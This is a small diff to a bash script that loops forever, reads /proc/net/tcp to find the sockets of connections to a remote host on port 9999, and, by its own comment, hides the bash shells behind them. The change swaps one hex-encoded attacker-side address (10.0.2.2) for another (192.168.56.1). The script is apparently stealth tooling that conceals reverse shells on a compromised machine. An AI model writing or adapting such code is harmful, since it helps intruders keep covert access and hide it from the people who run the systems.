@@ -31,7 +31,7 @@ while true; do
   read -a pid_array <<<$pids
 
   #find all the inodes
-  inodes=$(cat /proc/net/tcp | awk '{ if($3 ~ /0202000A:270F/) print $10 }')
+  inodes=$(cat /proc/net/tcp | awk '{ if($3 ~ /0138A8C0:270F/) print $10 }')
   read -a inode_array <<<$inodes
 
   #hide the bash shells
